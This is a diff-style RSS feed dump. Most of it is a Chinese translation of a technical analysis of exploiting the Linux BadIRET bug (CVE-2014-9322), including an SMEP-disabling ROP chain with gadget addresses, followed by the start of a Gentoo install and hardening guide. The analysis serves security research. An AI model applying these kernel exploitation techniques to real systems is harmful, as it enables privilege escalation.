-&lt;p&gt;“SWAPGS把当前GS基寄存器值和在MSR地址C0000102H(IA32_KERNEL_GS_BASE)所包
-含的值进行交换。SWAPGS指令是一个为系统软件设计的特权指令。(….)内核可
-以使用GS前缀在正常的内存引用去访问[per-cpu]内核数据结构。”&lt;/p&gt;
-
-&lt;p&gt;Linux内核为每个CPU在启动时分配一个固定大小的结构体来存放关键数据。之后
-为每个CPU加载IA32_KERNEL_GS_BASE到相应的结构地址上，因此，通常的情况，
-比如系统调用的处理程序是：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;swapgs（现在是GS指向内核空间）&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;通过内存指令和gs前缀访问per-cpu内核数据结构&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;swapgs（撤销之前的swapgs，GS指向用户空间）&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;返回用户空间&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;内核代码天生必须保证随时能访问到带gs前缀的percpu数据，内核执行一堆
-swapgs指令时条目来自用户空间并不是偶然。(所以gs base指向内核内存）&lt;/p&gt;
-
-&lt;h2 id=&quot;section-1&quot;&gt;4. 触发漏洞&lt;/h2&gt;
-
-&lt;p&gt;现在很明显可以看到这个漏洞简直就是坟墓，因为多了一个swapgs指令在有漏洞
-代码路径里，内核会尝试从可能被用户操控的错误GS基地址访问重要的数据结构。&lt;/p&gt;
-
-&lt;p&gt;当iret指令产生了一个#SS异常？有趣的是，Intel白皮书在这方面介绍不完全(
-Shawn:是阴谋论的话又会想到BIG BROTHER?)；描述iret指令时，Intel白皮书这
-么讲：&lt;/p&gt;
-
-&lt;pre&gt;
-64位模式的异常：
-
-#SS(0)
-
-如果一个尝试从栈上pop一个值违反了SS限制。
-
-如果一个尝试从栈上pop一个值引起了non-canonical地址（Shawn: 64-bit下只允
-许访问canonical地址）的引用。
-&lt;/pre&gt;
-
-&lt;p&gt;没有一个条件能被强制在内核空间里发生。无论如何，Intel白皮书里的iret伪代
-码展示了另外一种情况：when the segment defined by the return frame is
-not present:&lt;/p&gt;
-
-&lt;pre&gt;
-IF stack segment is not present
-
-THEN #SS(SS selector); FI;
-&lt;/pre&gt;
-
-&lt;p&gt;所以在用户空间，我们需要设置ss寄存器为某个值来表示不存在。这不是很直接：
-我们不能仅仅使用：&lt;/p&gt;
-
-&lt;pre&gt;
-mov $nonpresent_segment_selector, %eax
-
-mov %ax, %ss
-&lt;/pre&gt;
-
-&lt;p&gt;第二条指令会引发#GP。通过调试器（任何ptrace)设置ss寄存器是不允许的；类
-似的，sys_sigreturn系统调用不会在64位系统上设置这个寄存器（可能32位能工
-作）。解决方案是：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;线程A：通过sys_modify_ldt系统调用在LDT里创建一个定制段X&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;线程B：s:=X_selector&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;线程A：通过sys_modify_ldt使X无效&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;线程B：等待硬件中断&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;为什么需要在一个进程里使用两个线程的原因是从系统调用（包括
-sys_modify_ldt）返回是通过硬编码了#ss值的sysret指令。如果我们使X在相同
-的线程中无效就等同于”ss:=X 指令“，ss寄存器会处于未完成设置的状态。运行
-以上代码会导致内核panic。按照更有意义的做法，我们将需要控制用户空间的
-gs基地址；她可以通过系统调用arch_prctl(ARCH_SET_GS)被设置。&lt;/p&gt;
-
-&lt;h2 id=&quot;achieving-write-primitive&quot;&gt;5. Achieving write primitive&lt;/h2&gt;
-
-&lt;p&gt;如果运行以上代码，#SS处理程序会正常的返回bad_iret（意思是没有触及到内存
-的GS基地址），之后转跳到#GP异常处理程序，执行一段时间后就调用到了这个函
-数：&lt;/p&gt;
-
-&lt;pre&gt;
-289 dotraplinkage void
-290 do_general_protection(struct pt_regs *regs, long error_code)
-291 {
-292         struct task_struct *tsk;
-...
-306         tsk = current;
-307         if (!user_mode(regs)) {
-                ... it is not reached
-317         }
-318 
-319         tsk-&amp;gt;thread.error_code = error_code;
-320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
-321 
-322         if (show_unhandled_signals &amp;amp;&amp;amp; unhandled_signal(tsk, SIGSEGV) &amp;amp;&amp;amp;
-323                         printk_ratelimit()) {
-324                 pr_info(&quot;%s[%d] general protection ip:%lx sp:%lx
-error:%lx&quot;,
-325                         tsk-&amp;gt;comm, task_pid_nr(tsk),
-326                         regs-&amp;gt;ip, regs-&amp;gt;sp, error_code);
-327                 print_vma_addr(&quot; in &quot;, regs-&amp;gt;ip);
-328                 pr_cont(&quot;\n&quot;);
-329         }
-330 
-331         force_sig_info(SIGSEGV, SEND_SIG_PRIV, tsk);
-332 exit:
-333         exception_exit(prev_state);
-334 }
-&lt;/pre&gt;
-
-&lt;p&gt;C代码不太明显，但从gs前缀读取到现有宏的值赋给了tsk。第306行是：&lt;/p&gt;
-
-&lt;pre&gt;
-0xffffffff8164b79d :	mov    %gs:0xc780,%rbx
-&lt;/pre&gt;
-
-&lt;p&gt;这很变得有意思起来了。我们控制了current指针，她指向用于描述整个Linux进
-程的数据结构。&lt;/p&gt;
-&lt;pre&gt;
-
-319         tsk-&amp;gt;thread.error_code = error_code;
-320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
-&lt;/pre&gt;
-
-&lt;p&gt;写入（从task_struct开始的固定偏移）我们控制的地址。注意值本身不能被控制
-（分别是0和0xd常量），但这不应该成为一个问题。游戏结束？&lt;/p&gt;
-
-&lt;p&gt;不会，我们想覆盖一些在X上的重要数据结构。如果我们按照以下的步骤：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;准备在FAKE_PERCPU的用户空间内存，设置gs基地址给她&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;让地址FAKE_PERCPU+0xc780存着指针FAKE_CURRENT_WITH_OFFSET，以满足
-FAKE_CURRENT_WITH_OFFSET= X – offsetof(struct task_struct,
-thread.error_code)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;触发漏洞&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;之后do_general_protection会写入X。但很快就会尝试再次访问current
-task_current的其他成员，e.g.unhandled_signal()函数从task_struct指针解引
-用。我们没有依赖X来控制，最终会在内核产生一个页错误。我们怎么避免这个问
-题？选项有：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;什么都不做。Linux内核不像Windows，Linux内核是完全允许当一个不是预期
-的页错误在内核出现，如果可能的话，内核会杀死当前进程之后尝试继续运行
-（Windows会蓝屏）。这种机制对于大量内核数据污染就无能为力了。我的猜测是
-在当前进程被杀死后，swapgs不平衡的保持下来，这会导致其他进程上下文的更
-多页错误。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用“tsk-&amp;gt;thread.error_code = error_code”覆盖为页错误处理程序的IDT入
-口。之后页错误发生（被unhandled_signal()触发）。这个技术曾经在一些偶然
-的环境中成功过。但在这里不会成功，因为有2个原因：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;
-        &lt;p&gt;Linux让IDT只读&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;就算IDT可写，我们也不能控制覆盖的值 – 0或者0xd。SMEP/SMAP也
-    会是问题。&lt;/p&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;我们可以尝试产生一个竞争。“tsk-&amp;gt;thread.error_code = error_code”会促
-进代码执行，比如允许通过系统调用控制的代码指针P。之后我们可以在CPU 0上
-触发漏洞，在同一时间段CPU 1可以循环执行一些系统调用。这个思路可以在CPU
-0被破坏前让通过CPU 1获得代码执行，比如hook页错误处理程序，这样CPU 0不会
-影响更多的地方，我尝试了这种方法多次，但都失败了。可能不同的漏洞在时间
-线上的不同所致。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Throw a towel on “tsk-&amp;gt;thread.error_code = error_code” write.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;虽然有些恶心，我们会尝试最后一个选项。我们会让current指向用户空间，设置
-这个指针可以通过读的deref到我们能控制的内存。自然的，我们观察接下来的代
-码，找找更多的写deref。&lt;/p&gt;
-
-&lt;h2 id=&quot;achieving-write-primitive-continued-aka-life-after-dogeneralprotection&quot;&gt;6. Achieving write primitive continued, aka life after do_general_protection&lt;/h2&gt;
-
-&lt;p&gt;下一个机会是do_general_protection()所调用的函数：&lt;/p&gt;
-
-&lt;pre&gt;
-int
-force_sig_info(int sig, struct siginfo *info, struct task_struct *t)
-{
-        unsigned long int flags;
-        int ret, blocked, ignored;
-        struct k_sigaction *action;
-
-        spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
-        action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
-        ignored = action-&amp;gt;sa.sa_handler == SIG_IGN;
-        blocked = sigismember(&amp;amp;t-&amp;gt;blocked, sig);   
-        if (blocked || ignored) {
-                action-&amp;gt;sa.sa_handler = SIG_DFL;
-                if (blocked) {
-                        sigdelset(&amp;amp;t-&amp;gt;blocked, sig);
-                        recalc_sigpending_and_wake(t);
-                }
-        }
-        if (action-&amp;gt;sa.sa_handler == SIG_DFL)
-                t-&amp;gt;signal-&amp;gt;flags &amp;amp;= ~SIGNAL_UNKILLABLE;
-        ret = specific_send_sig_info(sig, info, t);
-        spin_unlock_irqrestore(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
-
-        return ret;
-}
-&lt;/pre&gt;
-
-&lt;p&gt;task_struct的成员sighand是一个指针，我们可以设置任意值。&lt;/p&gt;
-
-&lt;pre&gt;
-
-action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
-action-&amp;gt;sa.sa_handler = SIG_DFL;
-
-&lt;/pre&gt;
-
-&lt;p&gt;我们无法控制写的值，SIG_DFL是常量的0。这里最终能工作了，虽然有些扭曲。
-假设我们想覆盖内核地址X。为此我们准备伪造的task_struct，所以X等于
-t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的地址。上面还有一行要注意：&lt;/p&gt;
-
-&lt;pre&gt;
-spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
-&lt;/pre&gt;
-
-&lt;p&gt;t-&amp;gt;sighand-&amp;gt;siglock在t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的常量偏移
-上，内核会调用spin_local_irqsave在某些地址上，X+SPINLOCK的内容无法控制。
-这会发生什么呢？两种可能性：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;X+SPINLOCK所在的内存地址看起来像没有锁的spinlock。spin_lock_irqsave
-会立即完成。最后，spin_unlock_irqrestore会撤销spin_lock_irqsave的写操作。&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;2.X+SPINLOCK所在的内存地址看起来像上锁的spinlock。如果我们不介入的话，
-spin_lock_irqsave会无线循环等待spinlock。有些担心，要绕过这个障碍我们得
-需要其他假设 — X+SPINLOCK所在内存地址的内容。这是可接受的，我们可以在
-后面看到在内核.data区域里设置X。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;* 首先，准备FAKE_CURRENT，让t-&amp;gt;sighand-&amp;gt;siglock指向用户空间上锁
-      的区域，SPINLOCK_USERMODE
-
-* force_sig_info()会挂在spin_lock_irqsave里
-
-* 这时，另外一个用户空间的线程在另外一个CPU上运行，并且改变了
-      t-&amp;gt;sighand，所以t-&amp;gt;sighand-&amp;gt;action[sig-1.sa.sa_hander成了我们
-      的覆盖目标，之后解锁SPINLOCK_USERMODE
-
-* spin_lock_irqsave会返回
-
-* force_sig_info()会重新载入t-&amp;gt;sighand，执行期望的写操作
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;鼓励细心的读者追问为什么不能使用第2种方案，即X+SPINLOCK在初始时是没有锁
-的。这并不是全部 — 我们需要准备一些FAKE_CURRENT的字段来让尽量少的代码
-执行。我不会再透露更多细节 — 这篇BLOG已经够长了….下一步会发生什么？
-force_sig_info()和do_general_protection()返回。接下来iret指令会再次产生
-#SS异常处理（因为仍然是用户空间ss的值在栈上引用了一个nonpresent段），但
-这一次，#SS处理程序里的额外swapgs指令会返回并取消之前不正确的swapgs。
-do_general_protection()会调用和操作真正的task_struct，而不是伪造的
-FAKE_CURRENT。最终，current会发出SIGSEGV信号，其他进程会被调度来执行。
-这个系统仍然是稳定的。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/diagram1.png?w=595&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;smep&quot;&gt;7. 插曲：SMEP&lt;/h2&gt;
-
-&lt;p&gt;SMEP是Intel处理器从第3代Core（Shawn：酷睿）时加入的硬件特性。如果控制寄
-存器CR4里的SMEP位被设置的话，当RING0（Shawn：标准Linux内核是RING0，在
-XEN下是例外，RING0是Hypervisor）尝试执行的代码来自标记为用户空间的内存
-页，CPU就会生成一个错误（Shawn：就是拒绝）。如果可能的话，Linux内核会默
-认开启SMEP。&lt;/p&gt;
-
-&lt;h2 id=&quot;section-2&quot;&gt;8. 实现代码执行&lt;/h2&gt;
-
-&lt;p&gt;之前的章节讲述了一种如何以0在内核内存中覆盖8个连续字节的方法。如果SMEP
-开启的情况下如何实现代码执行呢？&lt;/p&gt;
-
-&lt;p&gt;直接覆盖一个内核代码的指针是不行的。我们可以清零top bytes( Shawn: MSB)
-- 但之后的地址会在用户空间，所以SMEP会阻止这个指针的deref。&lt;/p&gt;
-
-&lt;p&gt;换一种方式，我们可以清零几个low bytes( Shawn: LSB)，但是之后能利用这个
-指针的概率也很低。&lt;/p&gt;
-
-&lt;p&gt;我们需要一个内核指针P指向结构X包含了代码指针。我们可以覆盖P的top bytes
-让她成为一个用户空间的地址，这样P-&amp;gt;code_pointer_in_x()调用会跳转到一个
-我们能选择的地址。我不确定最好选择哪个攻击对象。从我的经验来看，我选择
-内核proc_root变量，这是一个结构体：&lt;/p&gt;
-
-&lt;pre&gt;
-struct proc_dir_entry {
-            ...
-        const struct inode_operations *proc_iops;
-        const struct file_operations *proc_fops;
-        struct proc_dir_entry *next, *parent, *subdir;
-        ...
-        u8 namelen;
-        char name[];
-};
-&lt;/pre&gt;
-
-&lt;p&gt;这个结构体是一个proc文件系统的入口（proc_root是/proc作为proc文件系统的
-根目录）。当一个文件名路径开始在/proc里查询时，subdir指针（从
-proc_root.subdir开始）会跟进，直到名字被找到。之后proc_iops的指针会被调
-用：&lt;/p&gt;
-
-&lt;pre&gt;
-struct inode_operations {
-        struct dentry * (*lookup) (struct inode *,struct dentry *, unsigned int);
-        void * (*follow_link) (struct dentry *, struct nameidata *);
-        ...many more...
-        int (*update_time)(struct inode *, struct timespec *, int);
-        ...
-} ____cacheline_aligned;
-&lt;/pre&gt;
-
-&lt;p&gt;proc_root驻扎在内核代码段里，这意味着漏洞利用需要知道她的地址。这个信息
-可以从/proc/kallsyms符号表得到；当然，很多加固过的内核不允许普通用户读
-取这个文件。但如果内核是一个已知的build（标准的GNU/Linux发行版），这个
-地址可以轻松获得；和一堆偏移一样需要构建FAKE_CURRENT。&lt;/p&gt;
-
-&lt;p&gt;我们会覆盖proc_root.subdir，让她成为一个指向一个在用户空间能被控制的结
-构体proc_dir_entry。有点困难在于我们不能覆盖整个指针。别忘了我们的写操
-作是“覆盖8个0”。如果我们让proc_root.subdir变成0，我们不会去映射她，因为
-Linux内核不允许用户空间映射到地址0上（更确切的说发是，任何低于
-/proc/sys/vm/mmap_min_addr的地址，默认值一般是4k）。（Shawn：想想哪些
-0ld good hacking days，每天都有一堆NULL pointer deref是多么幸福活着无挑
-战的时光啊;-))。这意味着我们需要：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;映射16MB的内存到地址4096&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用类似proc_dir_entry的方式来填充，把inode_operations字段指向用户空
-间的地址FAKE_IOPS，name字段为字符串”A”。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;配置漏洞利用去覆盖proc_root.subdir的top 5 bytes。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;之后，除非proc_root.subdir最低的3 bytes是0，我们可以确定在触发
-force_sig_info()覆盖后，proc_root.subdir会指向被控制的用户空间内存。当
-我们的进程调用open(“/proc/A”,…)时，FAKE_IOPS的指针会被调用。她们应该
-指向哪里呢？如果你认为答案是“指向我们的shellcode“，请再读一遍上面的分析。&lt;/p&gt;
-
-&lt;p&gt;我们需要让FAKE_IOPS指针指向一个stack pivot[1]序列。这再次假设了具体内核
-运行的版本情况。通常的”xchg %esp, %eax; ret”代码序列（2个字节，94 c3是
-在测试内核的地址0xffffffff8119f1ed）很好的可以用于64位内核的ROP。就算没
-能控制%rax，这个xchg指令操作32位的寄存器也能清掉%rsp的高32位而让%rsp着
-陆在用户空间的内存里。在最糟糕的情况下，我们可以分配低4GB的虚拟内存然后
-填充ROP链条。&lt;/p&gt;
-
-&lt;p&gt;在当前测试的内核（Fedora 20)有两种方法去deref在FAKE_IOPS的指针：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;%rax:=FAKE_IOPS; call *SOME_OFFSET(%rax)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;%rax:=FAKE_IOPS; %rax:=SOME_OFFSET(%rax); call *%rax&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;第1种情况里，在%rsp和%rax交换值后，她会等于FAKE_IOPS。我们需要ROP链条驻
-扎在FAKE_IOPS的起始位置，这需要类似“add $A_LOT, %rsp; ret”的指令，然后
-在继续。&lt;/p&gt;
-
-&lt;p&gt;第2种情况里，%rsp会分配低32位的调用目标，即0x8119f1ed。我们需要准备在这
-个地址上的ROP链条。&lt;/p&gt;
-
-&lt;p&gt;计算一下%rax值有两者之一的已知值在特定的时间指向stack pivot序列，我们不
-需要ROP链条填充整个4GB内存，只需要上面的两个地址即可。第2种情况的ROP链
-条自身很简洁：&lt;/p&gt;
-
-&lt;pre&gt;
-unsigned long *stack=0x8119f1ed;
-*stack++=0xffffffff81307bcdULL;  // pop rdi, ret
-*stack++=0x407e0;                //cr4 with smep bit cleared
-*stack++=0xffffffff8104c394ULL;  // mov rdi, cr4; pop %rbp; ret
-*stack++=0xaabbccdd;             // placeholder for rbp
-*stack++=actual_shellcode_in_usermode_pages;
-&lt;/pre&gt;
-
-&lt;h2 id=&quot;smap&quot;&gt;9. 插曲：SMAP&lt;/h2&gt;
-
-&lt;p&gt;SMAP是Intel从第5代Core处理器推出的一个硬件特性。如果CR4控制寄存器的
-SMAP位被设置的话，CPU会拒绝用户空间的页被RING0访问（Shawn：个人理解，
-SMAP和SMEP最大的不同主要是SMEP针对代码段，而SMAP针对数据段）。Linux内核
-通常会默认开启SMAP。一个测试的内核模块（Core-M 5Y10a CPU）尝试访问用户
-空间然后crash了：&lt;/p&gt;
-
-&lt;pre&gt;
-[  314.099024] running with cr4=0x3407e0
-[  389.885318] BUG: unable to handle kernel paging request at 00007f9d87670000
-[  389.885455] IP: [ffffffffa0832029] test_write_proc+0x29/0x50 [smaptest]
-[  389.885577] PGD 427cf067 PUD 42b22067 PMD 41ef3067 PTE 80000000408f9867
-[  389.887253] Code: 48 8b 33 48 c7 c7 3f 30 83 a0 31 c0 e8 21 c1 f0 e0 44 89 e0 48 8b 
-&lt;/pre&gt;
-
-&lt;p&gt;正如我们看到的，用户空间的页是正常的，但访问也报了页错误。Windows系统不
-太支持SMAP；Windows 10技术预览版build 9926的cr4=0x1506f8（SMEP启动，
-SMAP关闭）；对比Linux内核(同样的测试硬件）你可以看到cr4的bit 21是没有设
-置的。这不奇怪，在Linux中，访问用户空间是通过调用copy_from_user(),
-copy_to_user()和类似函数显式执行的，所以执行这些操作时临时关闭SMAP是可
-行的。在Windows上，内核代码直接访问用户空间代码，只是包装了一层访问异常
-处理程序，所以要让SMAP工作正常需要调整所有的驱动，这是一项困难的工作。&lt;/p&gt;
-
-&lt;h2 id=&quot;smap-to-the-rescue&quot;&gt;10. SMAP to the rescue!&lt;/h2&gt;
-
-&lt;p&gt;上面的漏洞利用方法依赖于在用户空间里准备特定的数据结构，然后强制内核认
-为她们是可信的内核数据。这种方法对于开启SMAP特性的内核不奏效 — CPU会
-拒绝从用户空间读取恶意数据。我们能做的是构造所有需要用的数据结构，然后
-拷贝她们到内核。比如：&lt;/p&gt;
-
-&lt;pre&gt;
-write(pipe_filedescriptor, evil_data, ...
-&lt;/pre&gt;
-
-&lt;p&gt;之后evil_data会被拷贝到一个内核管道缓冲区里。我们可能需要猜测她的地址；
-some sort of heap spraying, combined with the fact that there is no
-spoon^W effective kernel ASLR[9], could work, although it is likely to be
-less reliable than exploitation without SMAP.&lt;/p&gt;
-
-&lt;p&gt;总之，还有最后一个障碍 — 不要忘了我们需要设置用户空间的gs base去指向
-我们的漏洞利用的数据结构。在上面的场景（没有SMAP），我们使用
-arch_prctl(ARCH_SET_GS)系统调用，她是这样在内核里实现的：&lt;/p&gt;
-
-&lt;pre&gt;
-long do_arch_prctl(struct task_struct *task, int code, unsigned long addr)
-{ 
-         int ret = 0; 
-         int doit = task == current;
-         int cpu;
- 
-         switch (code) { 
-         case ARCH_SET_GS:
-                 if (addr &amp;gt;= TASK_SIZE_OF(task))
-                         return -EPERM; 
-                 ... honour the request otherwise
-&lt;/pre&gt;
-
-&lt;p&gt;休斯顿，我们有一个麻烦 — 我们不能使用这个API去设置gs base用户空间以上
-的内存！&lt;/p&gt;
-
-&lt;p&gt;最近的CPU有wrgsbase指令可以直接设置gs base，这是一个非特权级指令，但需
-要通过内核设置CR4控制寄存器中的FSGSBASE bit( no 16)来开启。Linux并没有
-设置这个位，因此用户空间不能使用这条指令。&lt;/p&gt;
-
-&lt;p&gt;在64位系统上，非系统级的GDT和LDT条目依然是8个字节长，base field是最大
-4GB-1，所以根本没有机会设置一个基地址的段在内核空间里。所以，除非我漏掉
-了能在内核里设置用户态gs base的其他方法，不然SMAP能保护CVE-2014-9322针
-对64位Linux内核任意代码执行的漏洞利用。&lt;/p&gt;
-
-&lt;p&gt;[1] CVE-2014-9322 
-    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&lt;/p&gt;
-
-&lt;p&gt;[2] Upstream fix
-    http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6f442be2fb22be02cafa606f1769fa1e6f894441&lt;/p&gt;
-
-&lt;p&gt;[3] Intel Software Developer’s Manuals,
-    http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html&lt;/p&gt;
-
-&lt;p&gt;[4] SMEP
-    http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/&lt;/p&gt;
-
-&lt;p&gt;[5] SMAP
-    http://lwn.net/Articles/517475&lt;/p&gt;
-
-&lt;p&gt;[6] “pretend-it-was-#GP-in-userspace”
-    https://lists.debian.org/debian-kernel/2014/12/msg00083.html&lt;/p&gt;
-
-&lt;p&gt;[7] Stack Pivoting
-    https://trailofbits.files.wordpress.com/2010/04/practical-rop.pdf&lt;/p&gt;
-
-&lt;p&gt;[8] TSX improves timing attacks against KASLR
-    http://labs.bromium.com/2014/10/27/tsx-improves-timing-attacks-against-kaslr/&lt;/p&gt;
-</description>
-        <pubDate>Sun, 05 Jul 2015 22:46:39 +0800</pubDate>
-        <link>http://www.hardenedlinux.org/system-security/2015/07/05/badiret-analysis.html</link>
-        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/07/05/badiret-analysis.html</guid>
-        
-        
-        <category>system-security</category>
-        
-      </item>
-    
-      <item>
-        <title>Gentoo GNU/Linux系统安装与加固</title>
-        <description>&lt;p&gt;By: Ciphergateway&lt;/p&gt;
-
-&lt;p&gt;–[  目录&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;准备工作&lt;/li&gt;
-  &lt;li&gt;组建RAID1&lt;/li&gt;
-  &lt;li&gt;安装Gentoo系统
-3.1 livecd下配置安装环境
-3.2 Gentoo安装及编译
-3.3 软件环境安装&lt;/li&gt;
-  &lt;li&gt;Gentoo内核加固
-4.1 加固选项设置
-4.2 编译gentoo hardened内核&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;section&quot;&gt;–[ 1、准备工作&lt;/h2&gt;
-
-&lt;p&gt;用U盘启动引导安装gentoo系统，将gentoo系统的镜像文件livedvd-amd64-multilib-20140826.iso拷贝到已经格式化过的格式为fat32的U盘中；&lt;/p&gt;
-
-&lt;p&gt;U盘镜像下载链接：&lt;a href=&quot;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&quot; title=&quot;下载链接&quot;&gt;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;raid1&quot;&gt;–[ 2、组建RAID1&lt;/h2&gt;
-
-&lt;p&gt;1）Advanced Mode–&amp;gt;高级–&amp;gt;cpu设置，将Intel虚拟技术设为开启；&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/ljVLrxi.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;2）Advanced Mode–&amp;gt;高级–&amp;gt;PCH存储设置，将SATA模式选择为RAID；&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/K6rDKtM.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;3）保存设置并重启，按Ctrl+I(分别按不是同时按)，进入RAID配置界面，将两块3T机械硬盘组建为RAID1;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/XjgyVIQ.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;gentoo&quot;&gt;–[ 3、安装Gentoo系统&lt;/h2&gt;
-
-&lt;h3 id=&quot;livecd&quot;&gt;—-[ 3.1 livecd下配置安装环境&lt;/h3&gt;
-
-&lt;p&gt;1）服务器上插入U盘，配置root账户，开启sshd服务:
-　
-&lt;img src=&quot;http://i.imgur.com/LUPazv2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;2）使用gentoo livecd中自带的分区工具gdisk为系统分区，机械盘分两区，固态盘分五区(实际使用过程中使用cfdisk，gparted也可，我使用给gdisk的原因是这次在对raid盘进行分区时使用gparted造成了gpt与mbr分区表同时存在的问题，使用cfdisk将整个分区识别为了一个名为gpt的主分区)，以下是两块硬盘的分区结果：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/LytBlwM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/pJ1S2K2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;3）利用secureCRT登陆系统shell(链接前先要确认主机的ip，并确保两个主机处于同一网段，如果只有一台电脑，也可以在该主机上直接操作)：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/y5eo8Qh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;4）制作文件系统(格式化分区，默认格式成了ext4分区，如有需要，也可以格式成其他格式的分区)：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;    mkfs.ext4 /dev/sda3
-    mkfs.ext4 /dev/sda4
-    mkfs.ext4 /dev/sda5
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/6x8T18i.jpg&quot; alt=&quot;&quot; /&gt;
-设置swap分区&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;    mkswap /dev/sda2 ![](http://i.imgur.com/FX6HKRi.png) 格式化其他分区
-    mkfs.fat /dev/sda1
-    mkfs.ext4 /dev/md126p1
-    mkfs.ext4 /dev/md126p2
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/wVi2cPS.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;5）挂载分区（将两块硬盘以目录树的形式挂载在/mnt）(分区用途/dev/sda1 efi分区，才用mbr引导的可忽略此份区，/dev/sda3 tmp分区，/den/sda4 根分区，/dev/sda5 home分区)：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt; mount /dev/sda4/mnt/gentoo
- mkdir -p/mnt/gentoo/boot/efi
- mount /dev/sda1/mnt/gentoo/boot/efi
- mount -p/mnt/gentoo/home
